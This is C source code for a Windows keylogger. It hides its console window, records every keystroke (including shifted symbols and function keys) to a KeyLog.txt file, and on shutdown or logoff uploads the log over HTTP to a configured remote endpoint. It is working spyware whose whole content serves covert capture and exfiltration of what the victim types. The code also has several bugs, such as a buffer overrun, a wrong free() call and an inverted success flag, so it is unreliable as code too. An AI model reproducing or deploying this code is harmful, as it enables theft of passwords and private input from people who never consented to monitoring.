#include <config.h>

#include <windows.h>
#include <wininet.h>
#include <shlwapi.h>

#include <stdio.h>
#include <stdbool.h>

static char outputFilePath[MAX_PATH];
static bool isRunning = true;

void KeyboardProcess()
{
    FILE* file = fopen(outputFilePath, "a");

    for (short keyCode = 0x08; keyCode <= 0xDE; keyCode++)
    {
        if (GetAsyncKeyState(keyCode) == -32767)
        {
            if (GetAsyncKeyState(VK_LSHIFT) ||
                GetAsyncKeyState(VK_RSHIFT))
                switch (keyCode) 
                {
                case '1':  fputc('!', file);  break;
                case '2':  fputc('@', file);  break;
                case '3':  fputc('#', file);  break;
                case '4':  fputc('$', file);  break;
                case '5':  fputc('%', file);  break;
                case '6':  fputc('^', file);  break;
                case '7':  fputc('&', file);  break;
                case '8':  fputc('*', file);  break;
                case '9':  fputc('(', file);  break;
                case '0':  fputc(')', file);  break;

                case 0xBA: fputc(':',  file);  break;
                case 0xBB: fputc('+',  file);  break;
                case 0xBC: fputc('<',  file);  break;
                case 0xBD: fputc('_',  file);  break;
                case 0xBE: fputc('>',  file);  break;
                case 0xBF: fputc('?',  file);  break;
                case 0xC0: fputc('~',  file);  break;
                case 0xDB: fputc('{',  file);  break;
                case 0xDC: fputc('|',  file);  break;
                case 0xDD: fputc('}',  file);  break;
                case 0xDE: fputc('\"', file); break;

                default:
                {
                    if (keyCode >= 0x41 && keyCode <= 0x5A)
                        fputc(toupper(keyCode), file);
                    else
                        fputs("<SHIFT>", file);
                } break;
            }
            else
                switch (keyCode)
                {
                case VK_LCONTROL: fputs("<LCTRL>",     file); break;
                case VK_RCONTROL: fputs("<RCTRL>",     file); break;
                case VK_LMENU:    fputs("<LALT>",      file); break;
                case VK_RMENU:    fputs("<RALT>",      file); break;
                case VK_LWIN:     fputs("<LWIN>",      file); break;
                case VK_RWIN:     fputs("<RWIN>",      file); break;
                case VK_INSERT:   fputs("<INSERT>",    file); break;
                case VK_END:      fputs("<END>",       file); break;
                case VK_PRINT:    fputs("<PRINT>",     file); break;
                case VK_DELETE:   fputs("<DELETE>",    file); break;
                case VK_BACK:     fputs("<BACKSPACE>", file); break;
                case VK_LEFT:     fputs("<LEFT>",      file); break;
                case VK_RIGHT:    fputs("<RIGHT>",     file); break;
                case VK_UP:       fputs("<UP>",        file); break;
                case VK_DOWN:     fputs("<DOWN>",      file); break;
                case VK_RETURN:   fputs("<RETURN>\n",  file); break;
                case VK_TAB:      fputs("<TAB>",       file); break;

                case VK_OEM_PLUS:   fputc('+', file); break;
                case VK_OEM_COMMA:  fputc(',', file); break;
                case VK_OEM_MINUS:  fputc('-', file); break;
                case VK_OEM_PERIOD: fputc('.', file); break;

                case VK_F1:  fputs("<F1>",  file); break;
                case VK_F2:  fputs("<F2>",  file); break;
                case VK_F3:  fputs("<F3>",  file); break;
                case VK_F4:  fputs("<F4>",  file); break;
                case VK_F5:  fputs("<F5>",  file); break;
                case VK_F6:  fputs("<F6>",  file); break;
                case VK_F7:  fputs("<F7>",  file); break;
                case VK_F8:  fputs("<F8>",  file); break;
                case VK_F9:  fputs("<F9>",  file); break;
                case VK_F10: fputs("<F10>", file); break;
                case VK_F11: fputs("<F11>", file); break;
                case VK_F12: fputs("<F12>", file); break;
                case VK_F13: fputs("<F13>", file); break;
                case VK_F14: fputs("<F14>", file); break;
                case VK_F15: fputs("<F15>", file); break;
                case VK_F16: fputs("<F16>", file); break;
                case VK_F17: fputs("<F17>", file); break;
                case VK_F18: fputs("<F18>", file); break;
                case VK_F19: fputs("<F19>", file); break;
                case VK_F20: fputs("<F10>", file); break;
                case VK_F21: fputs("<F21>", file); break;
                case VK_F22: fputs("<F22>", file); break;
                case VK_F23: fputs("<F23>", file); break;
                case VK_F24: fputs("<F24>", file); break;
                
                default: fputc(tolower(keyCode), file);
                }
        }
    }

    fclose(file);
}

static bool SendHTTPData()
{
    HINTERNET internetHandler = InternetOpen("HTTP", INTERNET_OPEN_TYPE_DIRECT,
                                             NULL, NULL, 0);
    if (!internetHandler)
        return false;

    HINTERNET connectHandler = InternetOpenUrl(internetHandler, KEYLOGGER_POST,
                                               NULL,  0, INTERNET_FLAG_RELOAD, 0);
    if (!internetHandler)
    {
        InternetCloseHandle(internetHandler);
        return false;
    }
   
    FILE* file = fopen(outputFilePath, "rb");
    if (!file)
    {
        InternetCloseHandle(connectHandler);
        InternetCloseHandle(internetHandler);
        return false;
    }

    fseek(file, 0, SEEK_END);
    size_t bufferSize = ftell(file);
    rewind(file);

    char* buffer = (char*) malloc(bufferSize);
    fread(buffer, 1, bufferSize, file);
    buffer[bufferSize] = 0;

    DWORD bytesWritten = 0;
    bool success = !InternetWriteFile(connectHandler, buffer, bufferSize, &bytesWritten) 
                    || bytesWritten != bufferSize;

    InternetCloseHandle(connectHandler);
    InternetCloseHandle(internetHandler);
    fclose(file);
    free(file);

    return success;
}

static void InitializeFile()
{
    GetModuleFileName(GetModuleHandle(NULL), outputFilePath, sizeof(outputFilePath));
    PathRemoveFileSpec(outputFilePath);
    strcat(outputFilePath, "\\KeyLog.txt");
}

static DWORD WINAPI HandlerRoutine(DWORD controlType)
{
    switch (controlType)
    {
        case CTRL_SHUTDOWN_EVENT:
        case CTRL_LOGOFF_EVENT:
        {
            return SendHTTPData();
        } break;

        default: 
            return false;
    }
}

int WINAPI WinMain(HINSTANCE instanceHandle, HINSTANCE previousInstanceHandle, LPSTR argv, int argc)
{
    (void) previousInstanceHandle;
    (void) instanceHandle;
    (void) argv;
    (void) argc;

    AllocConsole();
    HWND stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
    
    InitializeFile();
    SetConsoleCtrlHandler((PHANDLER_ROUTINE)HandlerRoutine, true);

    while (isRunning)
        KeyboardProcess();

    return 0;
}
